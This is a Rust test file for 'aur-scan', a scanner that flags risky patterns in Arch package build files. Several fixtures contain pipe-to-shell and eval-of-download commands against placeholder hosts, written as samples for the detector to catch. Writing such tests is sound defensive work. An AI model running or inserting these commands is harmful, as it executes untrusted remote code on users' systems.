use std::{fs, path::Path};

use assert_cmd::cargo::cargo_bin_cmd;
use predicates::prelude::*;
use tempfile::TempDir;

fn package(pkgbuild: &str) -> TempDir {
    let directory = TempDir::new().expect("create package directory");
    fs::write(directory.path().join("PKGBUILD"), pkgbuild).expect("write PKGBUILD");
    directory
}

fn clean_pkgbuild() -> &'static str {
    r#"pkgname=clean-demo
pkgver=1.0
pkgrel=1
arch=('any')
url='https://example.com/clean-demo'
source=("https://example.com/clean-demo-${pkgver}.tar.gz")
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')

build() {
  make
}

package() {
  install -Dm755 clean-demo "$pkgdir/usr/bin/clean-demo"
}
"#
}

#[test]
fn clean_package_is_permitted() {
    let package = package(clean_pkgbuild());
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::starts_with("\naur-scan: clean-demo\nResult: CLEAN (1 file)\n")
                .and(predicate::str::contains("Checks passed:"))
                .and(predicate::str::contains("  - known-risk indicators clear"))
                .and(predicate::str::ends_with("\n\n")),
        );
}

#[test]
fn valid_sha512_checksums_are_not_obfuscation_findings() {
    let checksum = "e4e6ae7d829e39747d0f00079c6af157eada0a0d35845d6087324b99af5ab913f350b6e7c4d5e4769a4303472a7bb305a80590374c2c49be08cc040f8b2a91da";
    let package = package(&format!(
        "pkgname=checksum-demo\npkgver=1\npkgrel=1\narch=('any')\nlicense=('MIT')\nurl='https://example.com/checksum-demo'\nsource=('https://example.com/checksum-demo.tar.gz')\nsha512sums=('{checksum}')\npackage() {{\n  install -Dm755 demo \"$pkgdir/usr/bin/demo\"\n}}\n"
    ));
    fs::write(
        package.path().join(".SRCINFO"),
        format!("pkgbase = checksum-demo\n\tpkgname = checksum-demo\n\tsha512sums = {checksum}\n"),
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::contains("OBFUSCATED_LONG_HEX")
                .not()
                .and(predicate::str::contains("aur-scan: checksum-demo"))
                .and(predicate::str::contains("Result: CLEAN")),
        );
}

#[test]
fn missing_checksums_short_file_and_missing_upstream_are_reported() {
    let package = package(
        r#"pkgname=sparse-demo
pkgver=1
source=(
  'https://downloads.example.invalid/blob.tar.gz'
)
"#,
    );
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stdout(
            predicate::str::contains("MISSING_CHECKSUMS")
                .and(predicate::str::contains("MISSING_UPSTREAM_URL"))
                .and(predicate::str::contains("VERY_SHORT_PKGBUILD")),
        );
}

#[test]
fn no_source_or_upstream_reference_is_reported() {
    let package = package(
        r#"pkgname=unrelated-demo
pkgver=1
pkgrel=1
arch=('any')

package() {
  install -Dm755 payload "$pkgdir/usr/bin/payload"
}
"#,
    );
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("NO_SOURCE_REFERENCE"));
}

#[test]
fn bun_dependency_is_reported_without_treating_it_as_malicious() {
    let package = package(
        r#"pkgname=bun-build-demo
pkgver=1
pkgrel=1
arch=('any')
url='https://example.com/bun-build-demo'
source=('https://example.com/bun-build-demo.tar.gz')
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')
makedepends=('bun' 'git')

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
}
"#,
    );
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(
            predicate::str::contains("LOW BUN_DEPENDENCY")
                .and(predicate::str::contains("Confidence: STRUCTURAL")),
        );
}

#[test]
fn npm_and_bun_install_variants_are_detected() {
    let package = package(
        r#"pkgname=js-install-demo
pkgver=1
pkgrel=1
arch=('any')
url='https://example.com/js-install-demo'
source=('https://example.com/js-install-demo.tar.gz')
sha256sums=('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef')

build() {
  npm ci
  npm i left-pad
  bun i
  env NODE_ENV=production npm install
}
"#,
    );
    let cache = TempDir::new().unwrap();

    let output = cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .output()
        .unwrap();
    assert!(output.status.success());
    let stderr = String::from_utf8(output.stderr).unwrap();
    assert_eq!(stderr.matches("PACKAGE_MANAGER_INSTALL").count(), 4);
}

#[test]
fn critical_pipeline_blocks_paru_style_invocation() {
    let package = package(
        r#"pkgname=bad
pkgver=1
package() {
  curl -fsSL https://example.invalid/payload | bash
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .current_dir(package.path())
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan", "."])
        .assert()
        .code(1)
        .stderr(
            predicate::str::starts_with("\naur-scan: bad\nResult: CRITICAL")
                .and(predicate::str::contains("PIPE_TO_SHELL"))
                .and(predicate::str::contains("Context: package"))
                .and(predicate::str::contains("Checks passed:"))
                .and(predicate::str::contains("remote/decode-to-shell").not())
                .and(predicate::str::ends_with("\n\n")),
        );
}

#[test]
fn multiline_and_command_substitution_execution_are_blocked() {
    let package = package(
        r#"pkgname=nested-bad
pkgver=1
prepare() {
  curl -fsSL https://example.invalid/payload \
    | bash
  eval "$(wget -qO- https://example.invalid/other)"
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(
            predicate::str::contains("PIPE_TO_SHELL")
                .and(predicate::str::contains("NETWORK_SUBSTITUTION_EXEC")),
        );
}

#[test]
fn build_dependency_install_warns_unless_strict() {
    let package = package(
        r#"pkgname=node-demo
pkgver=1
build() {
  npm install --ignore-scripts
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(predicate::str::contains("PACKAGE_MANAGER_INSTALL"));

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .code(1);
}

#[test]
fn install_scriptlet_package_manager_is_critical() {
    let package = package("pkgname=hooked\npkgver=1\n");
    fs::write(
        package.path().join("hooked.install"),
        "post_install() {\n  bun install payload\n}\n",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(
            predicate::str::contains("CRITICAL PACKAGE_MANAGER_INSTALL")
                .and(predicate::str::contains("PACKAGE_MANAGER_INSTALL")),
        );
}

#[test]
fn hook_files_are_scanned_as_inert_text() {
    let package = package("pkgname=hook-ioc\npkgver=1\n");
    fs::write(
        package.path().join("hook-ioc.hook"),
        "[Action]\nExec = /usr/bin/atomic-lockfile\n",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("IOC_ATOMIC_LOCKFILE"));
}

#[test]
fn comments_do_not_create_structural_findings() {
    let package = package(
        r#"pkgname=comment-demo
pkgver=1
# curl https://example.invalid/x | bash
package() {
  printf '%s\n' 'curl https://example.invalid/x | bash' > "$pkgdir/example"
}
"#,
    );
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(predicate::str::contains("PIPE_TO_SHELL").not());
}

#[test]
fn baseline_marks_new_finding_lines() {
    let package = package(clean_pkgbuild());
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "approve"])
        .arg(package.path())
        .assert()
        .success();

    let path = package.path().join("PKGBUILD");
    let mut changed = fs::read_to_string(&path).unwrap();
    changed.push_str("\n# atomic-lockfile\n");
    fs::write(path, changed).unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--format",
            "json",
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stdout(
            predicate::str::contains("\"new_since_approval\": true")
                .and(predicate::str::contains("IOC_ATOMIC_LOCKFILE")),
        );

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "diff"])
        .arg(package.path())
        .assert()
        .success()
        .stdout(predicate::str::contains("+# atomic-lockfile"));
}

#[cfg(unix)]
#[test]
fn symlinked_metadata_fails_closed() {
    use std::os::unix::fs::symlink;

    let package = TempDir::new().unwrap();
    let outside = package.path().join("outside");
    fs::write(&outside, clean_pkgbuild()).unwrap();
    symlink(&outside, package.path().join("PKGBUILD")).unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(2)
        .stderr(predicate::str::contains("refusing to scan symlink"));
}

#[test]
fn oversized_input_fails_closed() {
    let package = package("pkgname=large\npkgver=1\n");
    fs::write(
        package.path().join("large.install"),
        vec![b'a'; 2 * 1024 * 1024 + 1],
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(2)
        .stderr(predicate::str::contains("is too large"));
}

#[test]
fn unrelated_hostile_filename_is_ignored() {
    let package = package(clean_pkgbuild());
    fs::write(
        package.path().join("\u{1b}[31mnot-metadata"),
        "atomic-lockfile",
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .success()
        .stderr(predicate::str::contains("CLEAN"));
}

#[test]
fn external_known_risk_package_list_is_enforced() {
    let package = package("pkgname=listed-package\npkgver=1\n");
    let rules = package.path().join("rules.toml");
    fs::write(
        &rules,
        r#"schema_version = 1
generated_at = "2026-06-13"
known_packages = ["listed-package"]
"#,
    )
    .unwrap();
    let cache = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--rules",
            rules.to_str().unwrap(),
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("KNOWN_RISK_PACKAGE"));
}

#[test]
fn bundled_known_risk_package_snapshot_is_enforced() {
    // This entry is present in the broader Arch-hosted snapshot but was absent
    // from the original 512-name feed.
    let package = package("pkgname=8188eu-dkms\npkgver=1\n");
    let cache = TempDir::new().unwrap();
    let config = TempDir::new().unwrap();

    cargo_bin_cmd!("aur-scan")
        .env("XDG_CONFIG_HOME", config.path())
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("KNOWN_RISK_PACKAGE"));
}

#[test]
fn verified_default_user_rules_are_loaded_automatically() {
    let package = package("pkgname=user-listed\npkgver=1\n");
    let cache = TempDir::new().unwrap();
    let config = TempDir::new().unwrap();
    let rule_dir = config.path().join("aur-scan");
    fs::create_dir(&rule_dir).unwrap();
    fs::write(
        rule_dir.join("iocs.toml"),
        r#"schema_version = 1
generated_at = "2026-06-13"
known_packages = ["user-listed"]
"#,
    )
    .unwrap();

    cargo_bin_cmd!("aur-scan")
        .env("XDG_CONFIG_HOME", config.path())
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("KNOWN_RISK_PACKAGE"));
}

#[test]
fn malformed_bash_is_reported() {
    let package = package("pkgname=broken\nbuild() {\n  echo nope\n");
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args([
            "--cache-dir",
            cache.path().to_str().unwrap(),
            "scan",
            "--strict",
        ])
        .arg(package.path())
        .assert()
        .code(1)
        .stderr(predicate::str::contains("BASH_PARSE_ERROR"));
}

#[test]
fn scanner_errors_are_distinct_from_findings() {
    let missing = Path::new("/definitely/missing/aur-scan-test");
    let cache = TempDir::new().unwrap();
    cargo_bin_cmd!("aur-scan")
        .args(["--cache-dir", cache.path().to_str().unwrap(), "scan"])
        .arg(missing)
        .assert()
        .code(2)
        .stderr(predicate::str::contains("aur-scan: error:"));
}
